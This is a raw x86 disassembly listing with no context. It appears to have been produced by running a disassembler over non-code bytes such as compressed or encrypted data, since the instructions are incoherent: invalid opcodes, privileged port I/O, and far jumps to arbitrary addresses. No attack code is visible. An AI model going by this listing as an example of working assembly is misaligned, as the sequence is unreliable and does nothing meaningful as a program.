  41a20b:	shl    ebp,cl
  41a20d:	adc    eax,0x783826be
  41a212:	or     ebx,DWORD PTR [ebx]
  41a214:	sbb    DWORD PTR [ecx+0x355317c6],eax
  41a21a:	std    
  41a21b:	xchg   ebp,eax
  41a21c:	push   edi
  41a21d:	inc    ebp
  41a21e:	out    0xa2,al
  41a220:	or     eax,ebp
  41a222:	adc    eax,0x7ec9a3f5
  41a228:	aad    0x1f
  41a22a:	shl    BYTE PTR [eax],0x44
  41a22d:	ds retf 0x383c
  41a231:	mov    ebp,0x56a99131
  41a236:	bt     DWORD PTR [eax],eax
  41a239:	inc    eax
  41a23a:	cmp    al,0xe8
  41a23c:	pop    ds
  41a23d:	out    dx,al
  41a23e:	ss test al,0x89
  41a241:	jmp    0x41a24e
  41a243:	adc    DWORD PTR [edx],esp
  41a245:	jns    0x41a211
  41a247:	das    
  41a248:	add    edx,DWORD PTR [esi+0x18c4b16a]
  41a24e:	iret   
  41a24f:	dec    ebp
  41a250:	pop    es
  41a251:	push   0x73
  41a253:	retf   
  41a254:	sbb    ecx,DWORD PTR [esi]
  41a256:	jne    0x41a23a
  41a258:	je     0x41a23f
  41a25a:	cmc    
  41a25b:	jmp    0x560a9741
  41a260:	repnz mov ds:0x8c4b0c5,al
  41a266:	pcmpeqd mm0,QWORD PTR [edi+0xc]
  41a26a:	rol    ebp,1
  41a26c:	mov    ds:0x44763409,eax
  41a271:	call   0x8113:0x15e93685
  41a278:	int3   
  41a279:	repnz mov DWORD PTR [eax+0x4d],0x575638e4
  41a281:	mov    esi,DWORD PTR [ebx]
  41a283:	repnz mov edi,0xb3c6b169
  41a289:	mov    ecx,0xfaeb2749
  41a28e:	ror    DWORD PTR [ecx+0x2c],cl
  41a291:	ror    DWORD PTR [esp+ebp*8],cl
  41a294:	push   ss
  41a295:	mov    ds:0xb94d009d,eax
  41a29a:	sub    BYTE PTR [edi-0x685fdf5f],dh
  41a2a0:	js     0x41a302
  41a2a2:	xchg   ecx,eax
  41a2a3:	sub    esi,DWORD PTR [esp+ecx*2-0x5bd28b34]
  41a2aa:	xor    DWORD PTR ds:0x35deb532,0xffffffcb
  41a2b1:	cld    
  41a2b2:	jp     0x41a2b9
  41a2b4:	aam    0x7f
  41a2b6:	cmp    al,0x49
  41a2b8:	cmp    bh,0x56
  41a2bb:	mov    cl,BYTE PTR [ecx]
  41a2bd:	lods   eax,DWORD PTR ds:[esi]
  41a2be:	in     al,dx
  41a2bf:	shl    DWORD PTR [ecx+ebp*1-0x4],1
  41a2c3:	dec    ebp
  41a2c4:	mov    edx,0xa9e58784
  41a2c9:	fsubr  st(1),st
  41a2cb:	out    dx,eax
  41a2cc:	outs   dx,BYTE PTR ds:[esi]
  41a2cd:	mov    esp,0x9a91695a
  41a2d2:	lea    edx,[ebx*4-0x90928a5]
  41a2d9:	mov    dl,0x86
  41a2db:	xchg   esp,eax
  41a2dc:	sbb    BYTE PTR [ebp+0x2],ah
  41a2df:	jmp    0x5cea886a
  41a2e4:	jae    0x41a2f8
  41a2e6:	or     dh,ch
  41a2e8:	mov    ah,0x17
  41a2ea:	mov    eax,ds:0x7a1acfcc
  41a2ef:	inc    ebx
  41a2f0:	jb     0x41a333
  41a2f2:	jno    0x41a2b0
  41a2f4:	or     ah,bh
  41a2f6:	dec    esp
  41a2f7:	add    ebx,DWORD PTR [ebp-0x47c18b03]
  41a2fd:	nop
  41a2fe:	sbb    al,BYTE PTR [edi+0x3d61dd61]
  41a304:	sar    BYTE PTR [ebx+0x28],cl
  41a307:	lock cli 
  41a309:	add    ah,BYTE PTR [edi+0x20]
  41a30c:	inc    ebp
  41a30d:	mov    DWORD PTR [ebx+0x64],ebp
  41a310:	push   ss
  41a311:	inc    edi
  41a312:	ret    0x6bc8
  41a315:	xchg   esi,eax
  41a316:	mov    WORD PTR [esi-0x248b49e9],fs
  41a31c:	int    0x86
  41a31e:	sub    BYTE PTR [esi-0x43ef4d4],bl
  41a324:	mov    ah,0xc3
  41a326:	mov    edx,0x9e387333
  41a32b:	icebp  
  41a32c:	mov    esi,0xb6b5814b
  41a331:	es push ss
  41a333:	test   eax,ebp
  41a335:	mov    bl,BYTE PTR [ebp-0x71161ce0]
  41a33b:	sub    edi,DWORD PTR [esi+edi*1-0x7630f4c3]
  41a342:	ja     0x41a316
  41a344:	fsub   QWORD PTR [ebp+0x5b6e2c90]
  41a34a:	cmc    
  41a34b:	in     al,0x4f
  41a34d:	add    eax,DWORD PTR [edx+0x3f]
  41a350:	rcr    BYTE PTR [ecx-0x73],0xf6
  41a354:	jecxz  0x41a2e6
  41a356:	mov    ds:0xcbb89849,eax
  41a35b:	jl     0x41a318
  41a35d:	jl     0x41a33a
  41a35f:	shl    DWORD PTR [ecx+0x459f9e04],cl
  41a365:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a367:	scas   eax,DWORD PTR es:[edi]
  41a368:	sbb    eax,0x4a32a09f
  41a36d:	lea    esp,[edx-0x4812c499]
  41a373:	jmp    0xdf05:0x77af59d7
  41a37a:	mov    ebx,0x9bd4ecfd
  41a37f:	dec    esp
  41a380:	dec    esi
  41a381:	popf   
  41a382:	outs   dx,DWORD PTR ds:[esi]
  41a383:	(bad)  [esi+0x3b]
  41a386:	add    eax,eax
  41a388:	les    esp,FWORD PTR [edi-0x62]
  41a38b:	dec    ecx
  41a38c:	std    
  41a38d:	push   0xfffffffe
  41a38f:	data16 outs dx,BYTE PTR ds:[esi]
  41a391:	xchg   BYTE PTR [ecx],ch
  41a393:	and    BYTE PTR [eax-0x2320c8e],al
  41a399:	inc    ecx
  41a39a:	push   ecx
  41a39b:	add    dh,BYTE PTR [edx-0x14f9ff37]
  41a3a1:	jb     0x41a3a1
  41a3a3:	mov    bl,0x1d
  41a3a5:	lods   al,BYTE PTR ds:[esi]
  41a3a6:	cmp    cl,dl
  41a3a8:	aam    0xe1
  41a3aa:	ss jno 0x41a3cf
  41a3ad:	cmc    
  41a3ae:	mov    ds:0xec7087d,eax
  41a3b3:	jmp    0x41a388
  41a3b5:	inc    edi
  41a3b6:	jbe    0x41a3a6
  41a3b8:	imul   ebx,eax,0x8
  41a3bb:	pop    edi
  41a3bc:	enter  0xeefe,0x2a
  41a3c0:	sub    BYTE PTR [eax],bh
  41a3c2:	mov    al,0x53
  41a3c4:	pop    ebx
  41a3c5:	mov    BYTE PTR [eax-0x64d63aa9],ah
  41a3cb:	pop    ecx
  41a3cc:	ins    DWORD PTR es:[edi],dx
  41a3cd:	hlt    
  41a3ce:	lea    esi,[ebp+0x65290b2d]
  41a3d4:	ret    
  41a3d5:	or     eax,0xcf0595c4
  41a3da:	shl    BYTE PTR [ecx+0x37],0xf4
  41a3de:	(bad)  
  41a3e0:	xchg   ebp,eax
  41a3e1:	push   ds
  41a3e2:	lock jno 0x41a3cf
  41a3e5:	sti    
  41a3e6:	jle    0x41a36b
  41a3e8:	sti    
  41a3e9:	mov    ah,ch
  41a3eb:	loop   0x41a39e
  41a3ed:	std    
  41a3ee:	push   ss
  41a3ef:	push   ebx
  41a3f0:	sub    bl,bl
  41a3f2:	dec    ecx
  41a3f3:	adc    BYTE PTR [eax-0x3e],al
  41a3f6:	jne    0x41a43c
  41a3f8:	xchg   ecx,eax
  41a3f9:	stos   DWORD PTR es:[edi],eax
  41a3fa:	mov    bl,BYTE PTR [ebx]
  41a3fc:	pop    edi
  41a3fd:	or     cl,ch
  41a3ff:	inc    edi
  41a400:	add    DWORD PTR [edx+edx*4+0x43916988],ebx
  41a407:	mov    ds:0xe63f9190,eax
  41a40c:	test   DWORD PTR [edi-0x2d26432e],esi
  41a412:	js     0x41a3ed
  41a414:	shl    DWORD PTR [edx-0x6e17a67e],cl
  41a41a:	xor    eax,0x9a87917b
  41a41f:	aam    0xf4
  41a421:	pop    ecx
  41a422:	xchg   esp,eax
  41a423:	sbb    DWORD PTR [edx],edi
  41a425:	jmp    0x731d:0x519860a7
  41a42c:	jns    0x41a43b
  41a42e:	les    eax,FWORD PTR [ebp+0x17a4ca64]
  41a434:	jle    0x41a428
  41a436:	lock mov ah,0xe3
  41a439:	imul   edi,DWORD PTR [ebx+0x0],0x97fb2c49
  41a440:	mov    ebp,0x1c10f9b0
  41a445:	pop    ds
  41a446:	jno    0x41a433
  41a448:	jl     0x41a421
  41a44a:	mov    bl,0xbd
  41a44c:	in     al,0x4b
  41a44e:	das    
  41a44f:	int    0x68
  41a451:	and    dl,cl
  41a453:	or     ecx,DWORD PTR [ebx]
  41a455:	aam    0x56
  41a457:	push   eax
  41a458:	push   ecx
  41a459:	les    eax,FWORD PTR [esi]
  41a45b:	pop    edi
  41a45c:	out    dx,al
  41a45d:	jo     0x41a4da
  41a45f:	mov    al,BYTE PTR [ecx-0x75]
  41a462:	dec    edx
  41a463:	pop    esi
  41a464:	aaa    
  41a465:	xlat   BYTE PTR ds:[ebx]
  41a466:	sbb    BYTE PTR [esi-0x3c79fff5],cl
  41a46c:	pusha  
  41a46d:	in     al,dx
  41a46e:	into   
  41a46f:	ror    DWORD PTR [ebx-0x59],cl
  41a472:	icebp  
  41a473:	sub    eax,0x6bfaec4e
  41a478:	(bad)  
  41a47a:	retf   
  41a47b:	pop    esi
  41a47c:	and    al,BYTE PTR [ebx]
  41a47e:	aad    0x28
  41a480:	inc    edx
  41a481:	jno    0x41a4b0
  41a483:	or     BYTE PTR [edx+0xd],bh
  41a486:	add    al,0x3
  41a488:	data16 sub bh,BYTE PTR [esi+ebx*1]
  41a48c:	pop    edi
  41a48d:	xchg   DWORD PTR [ebp+0x185d1a28],ebx
  41a493:	xchg   DWORD PTR [eax+0x7bd886bc],ebp
  41a499:	fwait
  41a49a:	in     al,0xc1
  41a49c:	in     eax,0xc5
  41a49e:	lds    eax,FWORD PTR [edx]
  41a4a0:	xor    esp,DWORD PTR [eax]
  41a4a2:	fsub   QWORD PTR ds:0x964b137
  41a4a8:	push   eax
  41a4aa:	pop    esi
  41a4ab:	ja     0x41a519
  41a4ad:	fstp   DWORD PTR [ebx]
  41a4af:	ja     0x41a45b
  41a4b1:	jge    0x41a47c
  41a4b3:	popf   
  41a4b4:	sub    bh,cl
  41a4b6:	push   ecx
  41a4b7:	imul   ebp,DWORD PTR [esi],0x1df91bc7
  41a4bd:	sub    eax,0x66124537
  41a4c2:	mov    ds:0xdc2ba0bf,al
  41a4c7:	shr    BYTE PTR [edx-0x6ba1fd6f],1
  41a4cd:	mov    eax,ds:0xa79a04d1
  41a4d2:	adc    DWORD PTR [esp-0x64],ebx
  41a4d6:	clc    
  41a4d7:	bound  edx,QWORD PTR [ebx+eax*4+0x4fb58360]
  41a4de:	aaa    
  41a4df:	cwde   
  41a4e0:	adc    bh,BYTE PTR [esi+0x6b2439e7]
  41a4e6:	dec    ebp
  41a4e7:	stc    
  41a4e8:	pop    eax
  41a4e9:	and    esi,DWORD PTR ds:0xa6476410
  41a4ef:	int3   
  41a4f0:	add    al,0x2f
  41a4f2:	xchg   esi,eax
  41a4f3:	mov    edi,0xa5ad71f1
  41a4f8:	sbb    edx,esp
  41a4fa:	fld    QWORD PTR [esi-0x4d8c1cd0]
  41a500:	dec    edi
  41a501:	(bad)
  41a504:	mov    eax,0xa4ea721
  41a509:	stos   BYTE PTR es:[edi],al
  41a50a:	sub    BYTE PTR [ecx+0x3f],bh
  41a50d:	pop    esi
  41a50e:	jecxz  0x41a4f8
  41a510:	pop    eax
  41a511:	and    al,BYTE PTR [edx]
  41a513:	xor    al,ch
  41a515:	lock fiadd WORD PTR gs:[edx]
  41a519:	pop    esp
  41a51a:	test   al,0x9f
  41a51c:	mov    DWORD PTR [edi+0x77f67f4f],ecx
  41a522:	add    eax,0xb6b51a41
  41a527:	mov    bl,0x8c
  41a529:	mov    edi,0xe29b393f
  41a52e:	xor    BYTE PTR [edx],0x83
  41a531:	(bad)  
  41a533:	jbe    0x41a565
  41a535:	scas   al,BYTE PTR es:[edi]
  41a536:	dec    eax
  41a537:	mov    al,0xed
  41a539:	sbb    esp,ecx
  41a53b:	cdq    
  41a53c:	sub    ebx,DWORD PTR [ecx]
  41a53e:	es jnp 0x41a57e
  41a541:	outs   dx,DWORD PTR ds:[esi]
  41a542:	or     al,0xc0
  41a544:	xchg   bh,dl
  41a546:	xchg   esp,eax
  41a547:	inc    ebx
  41a548:	xor    DWORD PTR [edx+esi*4+0x36],ecx
  41a54c:	add    esi,eax
  41a54e:	(bad)  
  41a550:	cdq    
  41a551:	mov    esi,0x3dc44db1
  41a556:	pop    ebp
  41a557:	scas   eax,DWORD PTR es:[edi]
  41a558:	or     BYTE PTR [ecx-0x24d26194],0xc9
  41a55f:	lea    ecx,[ebx]
  41a561:	jecxz  0x41a5a1
  41a563:	add    al,0xe2
  41a565:	xchg   sp,ax
  41a567:	cdq    
  41a568:	push   eax
  41a569:	test   ah,0x54
  41a56c:	fisttp QWORD PTR [eax]
  41a56e:	arpl   di,dx
  41a570:	data16 jne 0x41a59d
  41a573:	and    BYTE PTR [esi],ch
  41a575:	push   es
  41a576:	loopne 0x41a54d
  41a578:	mov    bh,0x69
  41a57a:	in     eax,0xdb
  41a57c:	push   ds
  41a57d:	retf   0x4e14
  41a580:	mov    ecx,0xc36afbca
  41a585:	dec    edi
  41a586:	push   es
  41a587:	les    ecx,FWORD PTR [ebx-0x34]
  41a58a:	test   al,0xed
  41a58c:	loopne 0x41a51b
  41a58e:	ret    0x4212
  41a591:	cmp    edx,DWORD PTR [ecx]
  41a593:	outs   dx,BYTE PTR ds:[esi]
  41a594:	(bad)  
  41a596:	(bad)  
  41a597:	mov    dh,0x92
  41a599:	les    ebx,FWORD PTR [esp+0x68]
  41a59d:	cs ins BYTE PTR es:[edi],dx
  41a59f:	or     cl,bl
  41a5a1:	or     DWORD PTR ds:0xe8cc8d8,ebx
  41a5a7:	mov    ch,BYTE PTR ds:0xd046ec63
  41a5ad:	jno    0x41a58e
  41a5af:	retf   
  41a5b0:	cmp    BYTE PTR [esi],dh
  41a5b2:	mov    BYTE PTR ds:0x665c92df,0x10
  41a5b9:	push   es
  41a5ba:	cmp    al,0x41
  41a5bc:	cmp    ax,WORD PTR [ebx+0x6439638f]
  41a5c3:	daa    
  41a5c4:	in     eax,0xf0
  41a5c6:	test   DWORD PTR [edi],esi
  41a5c8:	es stos DWORD PTR es:[edi],eax
  41a5ca:	xchg   ecx,eax
  41a5cb:	bound  ebx,QWORD PTR [ebx-0x20cd11fe]
  41a5d1:	pop    ds
  41a5d2:	inc    ecx
  41a5d3:	mov    edi,0x58ff937a
  41a5d8:	adc    BYTE PTR [edi+ebx*2],0x79
  41a5dc:	add    bh,BYTE PTR [edx+0x75]
  41a5df:	push   edi
  41a5e1:	mov    WORD PTR [ecx+ecx*1-0x16e7752b],ds
  41a5e8:	jno    0x41a651
  41a5ea:	inc    ecx
  41a5eb:	dec    esp
  41a5ec:	mov    BYTE PTR [eax+0x61],ch
  41a5ef:	idiv   BYTE PTR [edi+0x52]
  41a5f2:	add    BYTE PTR [esi-0x61d015d6],dl
  41a5f8:	nop
  41a5f9:	mov    ds:0x40961265,al
  41a5fe:	jge    0x41a672
  41a600:	jnp    0x41a678
  41a602:	dec    edx
  41a603:	jecxz  0x41a59d
  41a605:	je     0x41a58e
  41a607:	sbb    al,0x5c
  41a609:	fs (bad) 
  41a60b:	std    
  41a60c:	mov    ebx,0x6ebe15aa
  41a611:	dec    esi
  41a612:	adc    ecx,DWORD PTR [ebp+ebp*4-0x7e]
  41a616:	adc    edx,DWORD PTR [ebx+esi*2+0x31]
  41a61a:	xor    DWORD PTR [esi-0x30],edx
  41a61d:	imul   esp,edi,0x88c1532e
  41a623:	out    0xc9,al
  41a625:	clc    
  41a626:	call   FWORD PTR [ebp+0x15ee0ee]
  41a62c:	loope  0x41a5cc
  41a62e:	inc    ecx
  41a62f:	adc    DWORD PTR [edx],0xc3903644
  41a635:	(bad)  
  41a636:	icebp  
  41a637:	sahf   
  41a638:	xchg   DWORD PTR [ebp-0x59],edx
  41a63b:	mov    esp,0xd4916f24
  41a640:	push   eax
  41a641:	mov    bh,0xf8
  41a643:	jl     0x41a670
  41a645:	cdq    
  41a646:	jno    0x41a62a
  41a648:	fdivrp st(6),st
  41a64a:	gs push esi
  41a64c:	in     eax,0x85
  41a64e:	sub    BYTE PTR [edi-0xb],0x8a
  41a652:	ja     0x41a66d
  41a654:	mov    ebx,0x949ad97d
  41a659:	stc    
  41a65a:	sub    eax,0xc9eb988c
  41a65f:	mov    esp,0xdcc3b862
  41a664:	cmp    DWORD PTR [ecx+edx*2-0x153dfa01],edi
  41a66b:	or     edx,DWORD PTR [edi]
  41a66d:	arpl   WORD PTR [edx+0x2a],sp
  41a670:	enter  0xcd26,0x8f
  41a674:	(bad)  
  41a675:	retf   
  41a676:	jb     0x41a63f
  41a678:	jle    0x41a630
  41a67a:	and    ecx,DWORD PTR [eax-0x776e528]
  41a680:	mov    edx,ebx
  41a682:	xchg   ebp,eax
  41a683:	lds    edi,FWORD PTR [ebx-0x40]
  41a686:	sbb    cl,BYTE PTR [edx]
  41a688:	xchg   esp,eax
  41a689:	dec    ebx
  41a68a:	repnz mov ecx,0xbff73c4
  41a690:	test   ebx,edx
  41a692:	out    dx,al
  41a693:	lods   eax,DWORD PTR ds:[esi]
  41a694:	push   eax
  41a695:	and    al,0xa7
  41a697:	push   ecx
  41a698:	sub    ebx,edx
  41a69a:	xor    BYTE PTR [edi],bl
  41a69c:	loopne 0x41a666
  41a69e:	bndstx [esi-0x3891012a],bnd0
  41a6a5:	mov    DWORD PTR [ebx],esp
  41a6a7:	push   0xa4c7a132
  41a6ac:	sub    eax,0x247ab8d
  41a6b1:	mov    ebx,0x7a0f73a8
  41a6b6:	in     al,dx
  41a6b7:	inc    eax
  41a6b8:	xchg   edx,eax
  41a6b9:	scas   al,BYTE PTR es:[edi]
  41a6ba:	out    dx,eax
  41a6bb:	shl    DWORD PTR [ebp+0x68b05a6a],1
  41a6c1:	mov    esi,0xc9777e59
  41a6c6:	mov    ah,0x5f
  41a6c8:	ja     0x41a742
  41a6ca:	sub    DWORD PTR [ebx+0x25],esp
  41a6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6ce:	xchg   edi,eax
  41a6cf:	and    dh,BYTE PTR [esi-0x51da16f]
  41a6d5:	mov    edx,0xc290645a
  41a6da:	pop    eax
  41a6db:	mov    ecx,0xe0502176
  41a6e0:	xor    edx,DWORD PTR [si]
  41a6e3:	push   esp
  41a6e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6e5:	cs pop edi
  41a6e7:	dec    ecx
  41a6e8:	es ins DWORD PTR es:[edi],dx
  41a6ea:	fnsave [eax+0x60]
  41a6ed:	mov    bl,0x66
  41a6ef:	xor    al,0xde
  41a6f1:	out    dx,al
  41a6f2:	sbb    ebp,DWORD PTR [eax+0x29]
  41a6f5:	mov    ecx,0x636fb21b
  41a6fa:	test   BYTE PTR [esp+edi*2],dh
  41a6fd:	(bad)
  41a700:	lods   al,BYTE PTR ds:[esi]
  41a701:	jmp    0xe1cb:0x58f9a642
  41a708:	or     ebx,DWORD PTR [eax-0x74222611]
  41a70e:	ja     0x41a698
  41a710:	dec    eax
  41a711:	pop    edi
  41a712:	adc    eax,0x9555e0f
  41a717:	sbb    eax,0xdd7a42b9
  41a71c:	shr    BYTE PTR [ecx+0x341f9c6b],1
  41a722:	xchg   edx,eax
  41a723:	mov    dl,BYTE PTR [ecx-0x66629b22]
  41a729:	push   ebp
  41a72a:	enter  0xcf59,0x2d
  41a72e:	(bad)  
  41a72f:	xchg   esp,eax
  41a730:	pop    ecx
  41a731:	adc    ch,BYTE PTR [eax-0x78]
  41a734:	fldenv [eax+0x33]
  41a737:	idiv   edi
  41a739:	loope  0x41a725
  41a73b:	in     eax,0xe3
  41a73d:	adc    cl,dl
  41a73f:	or     DWORD PTR [ebp+0x7a786cb0],esi
  41a745:	call   0x9e346071
  41a74a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74b:	stc    
  41a74c:	xchg   BYTE PTR [ebx-0x614adf25],bl
  41a752:	jp     0x41a790
  41a754:	sti    
  41a755:	popa   
  41a756:	cmc    
  41a757:	and    al,0x1a
  41a759:	pop    es
  41a75a:	mov    al,0x41
  41a75c:	push   ebp
  41a75d:	pop    ebp
  41a75e:	cmp    eax,0x6730268e
  41a763:	loope  0x41a737
  41a765:	mov    DWORD PTR [ebp-0xf0f31c8],ebx
  41a76b:	scas   al,BYTE PTR es:[edi]
  41a76c:	in     eax,dx
  41a76d:	in     al,dx
  41a76e:	lahf   
  41a76f:	fcom   DWORD PTR [eax+eax*8-0x29260e9]
  41a776:	aaa    
  41a777:	test   eax,0xf896251
  41a77c:	dec    ecx
  41a77d:	dec    ecx
  41a77e:	push   0xffffffb3
  41a780:	adc    dl,BYTE PTR [edi-0x6b93a9a5]
  41a786:	fwait
  41a787:	dec    esi
  41a788:	(bad)  
  41a789:	hlt    
  41a78a:	fwait
  41a78b:	rcr    DWORD PTR [ecx],1
  41a78d:	pop    ecx
  41a78e:	and    al,0xe3
  41a790:	outs   dx,BYTE PTR ds:[esi]
  41a791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a792:	repnz sbb DWORD PTR [edi+0x482e5412],ebp
  41a799:	rcr    dl,0x5a
  41a79c:	mov    esi,DWORD PTR [ecx+0x5875bef4]
  41a7a2:	rol    DWORD PTR [eax+esi*2-0x2f08e01e],0x12
  41a7aa:	and    DWORD PTR [ebp-0x6304c0c6],edx
  41a7b0:	pop    eax
  41a7b1:	and    eax,0xa939388
  41a7b6:	ja     0x41a7d3
  41a7b8:	and    eax,0x137abe6e
  41a7bd:	add    DWORD PTR [edx+edi*8-0x55],0x33fe50aa
  41a7c5:	jbe    0x41a76d
  41a7c7:	(bad)  
  41a7c8:	(bad)  
  41a7ca:	mov    bl,0x7d
  41a7cc:	ffree  st(3)
  41a7ce:	lods   al,BYTE PTR ds:[esi]
  41a7cf:	inc    edi
  41a7d0:	mov    DWORD PTR [edi-0x3f],ebx
  41a7d3:	int3   
  41a7d4:	cmp    al,0x80
  41a7d6:	jno    0x41a766
  41a7d8:	outs   dx,BYTE PTR ds:[esi]
  41a7d9:	fwait
  41a7da:	enter  0x29fc,0x91
  41a7de:	inc    esi
  41a7df:	mov    ds:0xf698ff1c,eax
  41a7e4:	or     DWORD PTR [ebp-0x3369b192],esp
  41a7ea:	imul   esi,DWORD PTR [edi],0x1b
  41a7ed:	push   edi
  41a7ee:	cmc    
  41a7ef:	push   ebx
  41a7f0:	outs   dx,BYTE PTR ds:[esi]
  41a7f1:	lds    edx,FWORD PTR [ebx+0x16]
  41a7f4:	pop    esp
  41a7f5:	or     eax,0xc8104757
  41a7fa:	ret    
  41a7fb:	ss mov edx,0x1f27d859
  41a801:	pop    eax
  41a802:	shl    BYTE PTR [edi+0x25],0x8b
  41a806:	xchg   esi,eax
  41a807:	outs   dx,BYTE PTR ds:[esi]
  41a808:	inc    eax
  41a809:	outs   dx,DWORD PTR ds:[esi]
  41a80a:	repz aad 0x9e
  41a80d:	or     ebp,DWORD PTR [eax]
  41a80f:	pop    edi
  41a810:	dec    ebp
  41a811:	xchg   ebx,eax
  41a812:	jmp    ecx
  41a814:	in     al,dx
  41a815:	in     eax,dx
  41a816:	ror    BYTE PTR [ecx+0x31d197f7],1
  41a81c:	mov    al,ds:0xd3ed1484
  41a821:	push   0xffffffde
  41a823:	or     al,0x9b
  41a825:	jmp    0xac27b8af
  41a82a:	sbb    ebp,ebp
  41a82c:	push   ecx
  41a82d:	pop    esp
  41a82e:	jge    0x41a851
  41a830:	xchg   DWORD PTR [edx-0x30300c13],edx
  41a836:	mov    edi,0xf63b6dff
  41a83b:	jg     0x41a826
  41a83d:	pop    edx
  41a83e:	sub    ebx,0x84ab4067
  41a844:	inc    ecx
  41a845:	inc    edx
  41a846:	in     al,dx
  41a847:	mov    esi,0x8e198471
  41a84c:	dec    ecx
  41a84d:	pop    ss
  41a84e:	repz test DWORD PTR [esi+0x4fb5c463],esi
  41a855:	xchg   esp,eax
  41a856:	dec    edi
  41a857:	out    0x4f,al
  41a859:	loop   0x41a825
  41a85b:	inc    eax
  41a85c:	jecxz  0x41a891
  41a85e:	retf   
  41a85f:	loope  0x41a820
  41a861:	cmp    eax,0xc010c743
  41a866:	or     al,0xf5
  41a868:	or     ah,BYTE PTR [edx+0xa35d145]
  41a86e:	out    0x99,eax
  41a870:	cdq    
  41a871:	adc    al,BYTE PTR [edx]
  41a873:	psrlq  mm5,QWORD PTR [esi]
  41a876:	jg     0x41a804
  41a878:	sub    DWORD PTR [esi],edi
  41a87a:	and    eax,0x35cee4f
  41a87f:	test   al,0xe6
  41a881:	ret    
  41a882:	ret    
  41a883:	shr    DWORD PTR [edi+0xedba448],0x5
  41a88a:	sar    eax,cl
  41a88c:	dec    ebp
  41a88d:	push   eax
  41a88e:	cli    
  41a88f:	aas    
  41a890:	add    BYTE PTR [edi],cl
  41a892:	jp     0x41a8ab
  41a894:	fisub  DWORD PTR [edi+0xe28b4ac]
  41a89a:	js     0x41a8bd
  41a89c:	bnd ja 0x41a87e
  41a89f:	adc    al,0x70
  41a8a1:	push   esi
  41a8a2:	adc    BYTE PTR [edi-0x78df7187],cl
  41a8a8:	retf   0xc11b
  41a8ab:	mov    ds:0x917b2810,al
  41a8b0:	and    cl,dh
  41a8b2:	loopne 0x41a848
  41a8b4:	sub    eax,0xa28d4aa3
  41a8b9:	inc    esp
  41a8ba:	add    al,0x8f
  41a8bc:	leave  
  41a8bd:	loope  0x41a92a
  41a8bf:	je     0x41a8ce
  41a8c1:	push   ds
  41a8c2:	pop    esi
  41a8c3:	repnz pushf 
  41a8c5:	mov    ecx,0xc878db9b
  41a8ca:	push   ds
  41a8cb:	ret    
  41a8cc:	and    dh,BYTE PTR [ecx-0x1000e959]
  41a8d2:	mov    ebp,DWORD PTR [esi-0x5b5cba3a]
  41a8d8:	jmp    0x9ac9:0xd51870d0
  41a8df:	push   ebp
  41a8e0:	xor    DWORD PTR [ebx+0x57837bc5],edx
  41a8e6:	retf   0xac4e
  41a8e9:	or     eax,0xd397c24b
  41a8ee:	adc    dh,al
  41a8f0:	out    dx,al
  41a8f1:	pop    ss
  41a8f2:	jg     0x41a8b6
  41a8f4:	xor    al,0xf1
  41a8f6:	push   eax
  41a8f7:	jmp    0x9e7f3bda
  41a8fc:	mov    es,WORD PTR [eax-0xb]
  41a8ff:	scas   al,BYTE PTR es:[edi]
  41a900:	out    dx,al
  41a901:	inc    ebp
  41a902:	xchg   edx,eax
  41a903:	daa    
  41a904:	xor    DWORD PTR [edi-0x8b7314a],edi
  41a90a:	gs not ecx
  41a90d:	out    dx,al
  41a90e:	sti    
  41a90f:	mul    DWORD PTR [edx-0x1b]
  41a912:	dec    ebx
  41a913:	pop    esp
  41a914:	retf   0xf6a4
  41a917:	add    BYTE PTR [edi],cl
  41a919:	(bad)  
  41a91a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41a91c:	sub    ah,BYTE PTR [ebx]
  41a91e:	sub    BYTE PTR [ecx+edx*2+0x22f10332],bl
  41a925:	push   edi
  41a926:	push   edi
  41a927:	fwait
  41a928:	imul   edx,ebx,0xffffff99
  41a92b:	xchg   ebp,esi
  41a92d:	test   eax,0xa5677da
  41a932:	ins    BYTE PTR es:[edi],dx
  41a933:	dec    ebp
  41a934:	ins    DWORD PTR es:[edi],dx
  41a935:	jl     0x41a8df
  41a937:	ret    0xb58e
  41a93a:	lds    edx,FWORD PTR [edi-0x2f]
  41a93d:	or     DWORD PTR [edx+eiz*1+0x719d8d4f],edi
  41a944:	repnz xchg edi,eax
  41a946:	dec    edx
  41a947:	adc    cl,BYTE PTR [edi-0x71]
  41a94a:	test   eax,0x2213ac40
  41a94f:	or     eax,0xd49d07bf
  41a954:	sub    BYTE PTR [edi],bh
  41a956:	js     0x41a930
  41a958:	je     0x41a8fc
  41a95a:	push   cs
  41a95b:	cdq    
  41a95c:	aam    0x7c
  41a95e:	test   ch,dl
  41a960:	fisttp QWORD PTR [esi-0x72441b78]
  41a966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a967:	fwait
  41a968:	nop
  41a969:	ins    BYTE PTR es:[edi],dx
  41a96a:	cld    
  41a96b:	jge    0x41a948
  41a96d:	stos   BYTE PTR es:[edi],al
  41a96e:	mov    bh,0xd9
  41a970:	pop    ecx
  41a971:	xchg   edi,eax
  41a972:	sti    
  41a973:	fwait
  41a974:	retf   0x9619
  41a977:	cdq    
  41a978:	dec    esp
  41a979:	ds fwait
  41a97b:	test   DWORD PTR [esi-0x6b],ebp
  41a97e:	pop    ds
  41a97f:	xlat   BYTE PTR ds:[ebx]
  41a980:	cli    
  41a981:	sbb    ecx,DWORD PTR [edx+0x76a95084]
  41a987:	outs   dx,DWORD PTR ds:[esi]
  41a988:	or     ch,BYTE PTR [esi]
  41a98a:	test   eax,0xe08e92b9
  41a98f:	(bad)  
  41a990:	ror    BYTE PTR [edi+0x1c00e841],1
  41a996:	aam    0xf6
  41a998:	popf   
  41a999:	and    ebp,ebx
  41a99b:	not    al
  41a99d:	jl     0x41a9c3
  41a99f:	or     al,0x18
  41a9a1:	pop    ebx
  41a9a2:	and    cl,bh
  41a9a4:	xchg   esp,eax
  41a9a5:	hlt    
  41a9a6:	add    al,0x73
  41a9a8:	add    ch,dh
  41a9aa:	inc    edx
  41a9ab:	jno    0x41a9b1
  41a9ad:	cwde   
  41a9ae:	pusha  
  41a9af:	jne    0x41a9e1
  41a9b1:	out    dx,al
  41a9b2:	ret    0x7092
  41a9b5:	aas    
  41a9b6:	cld    
